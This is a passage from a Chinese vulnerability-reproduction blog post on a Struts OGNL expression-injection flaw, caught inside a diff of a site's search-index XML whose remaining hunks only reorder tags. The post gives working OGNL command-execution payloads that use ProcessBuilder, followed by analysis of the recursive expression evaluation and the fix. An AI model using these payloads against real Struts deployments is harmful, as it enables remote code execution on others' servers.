title="漏洞利用"></a>漏洞利用</h3><p>根据官方漏洞通告，漏洞算是一个 OGNL 表达式注入的漏洞，原因在于 struts 在渲染模板的时候会递归计算表达式，而 struts 中的 JSP 页面中的表单值跟 Action 变量是绑定的，所以在 username 变量为 %{1+1} 的情况下会在本来的 %{username} 这样的表达式中将 username 当作一个表达式来处理。</p><p>所以漏洞可以在用于页面渲染的变量可控的情况下触发，比如传一个 username，然后 struts 又把这个 username 贴回模板里的时候。</p><p>贴一个命令执行的 payload：</p><pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p>还有：</p><pre><code>%{(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;deepin-calculator&quot;})).start()}</code></pre><p>比 spel 的反射链命令执行好看很多。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>不熟悉 struts 和 tomcat 的流程，按照他渲染肯定要获取 username 的想法，给 getUsername 下断点来调试，找到 UIBean.class 的 end 函数：</p><pre><code class="java">public boolean end(Writer writer, String body) {    this.evaluateParams();    try {        super.end(writer, body, false);        this.mergeTemplate(writer, this.buildTemplateName(this.template, this.getDefaultTemplate()));    } catch (Exception var7) {        LOG.error(&quot;error when rendering&quot;, var7);    } finally {        this.popComponentStack();    }    return false;}</code></pre><p>很明显这里就是最后返回 HTML 页面的地方，跟入处理参数的 evaluateParams 方法，看到关键代码：</p><pre><code class="java">Class valueClazz = this.getValueClassType();if (valueClazz != null) {    if (this.value != null) {        this.addParameter(&quot;nameValue&quot;, this.findValue(this.value, valueClazz));    } else if (name != null) {        String expr = name;        if (this.altSyntax()) {            expr = &quot;%{&quot; + name + &quot;}&quot;;        }        this.addParameter(&quot;nameValue&quot;, this.findValue(expr, valueClazz));    }}</code></pre><p>这里的 name 就是变量名 username，valueClazz 就是变量类型，这里将 username 拼接成 %{username} 的表达式并执行，然后用执行结果渲染模板，继续往下走，来到 translateVariables 方法：</p><pre><code class="java">while (true) {    int start = expression.indexOf(open + &quot;{&quot;);    int length = expression.length();    int x = start + 2;    int end;    char c;    int count = 1;    while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) {        c = expression.charAt(x++);        if (c == &#39;{&#39;) {            count++;        } else if (c == &#39;}&#39;) {            count--;        }    }    end = x - 1;    if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) {        String var = expression.substring(start + 2, end);        Object o = stack.findValue(var, asType);        if (evaluator != null) {            o = evaluator.evaluate(o);        }        String left = expression.substring(0, start);        String right = expression.substring(end + 1);        if (o != null) {            if (TextUtils.stringSet(left)) {                result = left + o;            } else {                result = o;            }            if (TextUtils.stringSet(right)) {                result = result + right;            }            expression = left + o + right;        } else {            // the variable doesn&#39;t exist, so don&#39;t display anything            result = left + right;            expression = left + right;        }    } else {        break;    }}</code></pre><p>这里就是漏洞公告里面提到的递归执行表达式了，是一个死循环，不停地寻找最里层的 %{} 表达式，执行之后将返回结果和前后拼接再次寻找 %{} 来执行。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 translateVariables 方法的递归中加上了最大递归层数，一般为 1：</p><pre><code class="java">if (loopCount &gt; maxLoopCount) {    // translateVariables prevent infinite loop / expression recursive evaluation    break;}</code></pre><hr><p>Orz</p>]]></content>
     
     
     
@@ -286,9 +305,9 @@
       
       <tag>Web</tag>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -421,9 +440,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -522,9 +541,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -543,9 +562,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -564,9 +583,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -650,9 +669,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -671,9 +690,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -692,9 +711,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -713,9 +732,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -795,9 +814,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -856,9 +875,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -879,9 +898,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -900,9 +919,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -940,9 +959,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1022,9 +1041,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1163,9 +1182,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1205,9 +1224,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1226,9 +1245,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
